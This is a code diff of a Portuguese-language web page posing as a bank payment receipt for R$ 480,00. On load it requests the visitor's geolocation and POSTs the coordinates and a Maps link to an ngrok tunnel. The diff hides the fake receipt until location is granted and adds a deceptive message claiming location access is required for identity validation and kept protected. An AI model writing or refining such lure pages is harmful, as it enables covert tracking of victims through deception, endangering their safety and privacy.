@@ -1,21 +1,44 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de pagamento</title>
   <link rel="stylesheet" href="styles.css" />
+  <style>
+    /* Área de erro estilizada */
+    #comprovante {
+    display: none; /* Agora ele começa escondido */
+  }
+    #erro-localizacao {
+      color: #333; /* Cinza escuro - mais profissional */
+      font-size: 16px;
+      text-align: center;
+      margin: 50px 20px;
+      background-color: #f9f9f9;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+  </style>
 </head>
 
 <body>
-  <div class="comprovante-container">
+  <!-- Área de erro -->
+  <div id="erro-localizacao"></div>
+
+  <!-- Área do comprovante -->
+  <div id="comprovante" class="comprovante-container">
     <h1>Comprovante de pagamento</h1>
 
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 480,00 </p>
-      <p><span>para:</span>Gleiso Pereira dos Santos</p>
+      <p><span>para:</span> Gleiso Pereira dos Santos</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
@@ -25,34 +48,27 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        navigator.geolocation.getCurrentPosition(
+          sucessoNaLocalizacao,
+          erroNaLocalizacao,
+          { timeout: 5000 }
+        );
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        mostrarErro("Seu navegador não suporta geolocalização.");
       }
     });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
+    function sucessoNaLocalizacao(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
+      // Envia a localização para o servidor
       fetch("https://4df7-45-235-20-165.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
@@ -60,21 +76,37 @@
         },
         body: JSON.stringify({ latitude, longitude, maps })
       })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        if (!data.success) {
+          console.warn("Erro ao enviar localização.");
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+      });
+
+      // Se deu tudo certo, mostra o comprovante
+      document.getElementById("comprovante").style.display = "block";
+      document.getElementById("erro-localizacao").style.display = "none";
+
+      // Atualiza a data no comprovante
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      const dataFormatada = `${dia}/${mes}/${ano}`;
+      document.getElementById("data-atual").textContent = dataFormatada;
     }
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+    function erroNaLocalizacao(error) {
+      mostrarErro("Por questões de segurança e validação de identidade, é necessário autorizar o acesso à sua localização para visualizar este comprovante de pagamento. A sua informação é protegida e utilizada apenas para garantir a autenticidade da operação.");
+    }
+
+    function mostrarErro(mensagem) {
+      document.getElementById("erro-localizacao").textContent = mensagem;
+      document.getElementById("comprovante").style.display = "none";
     }
   </script>
 </body>
-
 </html>
